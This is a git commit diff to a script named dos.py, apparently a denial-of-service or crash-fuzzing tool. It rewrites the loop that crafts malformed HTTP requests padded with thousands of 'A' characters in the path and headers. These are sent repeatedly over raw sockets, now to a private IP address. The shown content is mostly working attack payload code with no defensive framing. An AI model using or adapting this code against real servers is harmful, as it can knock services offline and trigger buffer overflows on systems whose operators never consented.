9d136ff3758964342d7502d329cb00d493e4c4b7
EgeBalci <egebal1996@gmail.com>
2018-03-12 20:35:26 +0300

    Better code & check function added & documentation added

--- dos.py
+++ dos.py
@@ -32,26 +32,10 @@ while True:
     if o == 4:
 	    o = 0
 
-    if rnd == 1:
-        payload = "PUT /index.html HTTP/1.1\n"
-        payload += "Host: localhost\n"
-        payload += "User-Agent: Mozilla\n"
-        payload += "Accept: */*"+("A"*random.randrange(0,8000))+"\r\n\r\n"
-    elif rnd == 2:
-        payload = "POST /"+("A"*random.randrange(0,8000))+" HTTP/0.9\n"
-        payload += "Host: localhost\n"
-        payload += "User-Agent: Mozilla\n"
-        payload += "Accept: */*\r\n\r\n"
-    elif rnd == 3:
-        payload = "POST /index.html HTTP/0.9\n"
-        payload += "Host: localhost\n"
-        payload += "User-Agent: Mozilla"+("A"*random.randrange(0,8000))+"\n"
-        payload += "Accept: */*\r\n\r\n"
-    elif rnd == 4:
-        payload = "GET /index.html HTTP/0.9\n"
-        payload += "Host: localhost\n"
-        payload += "User-Agent: Mozilla\n"
-        payload += "Accept: */*"+("A"*random.randrange(0,8000))+"\r\n\r\n"
+    payload = "GET /"+("A"*random.randrange(0,8000))+" HTTP/0.9\n"
+    payload += "Host: 192.168.1.27\n"
+    payload += "User-Agent: "+("A"*random.randrange(0,8000))+"\n"
+    payload += "Accept: "+("A"*random.randrange(0,8000))+"\r\n\r\n"
 
     try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
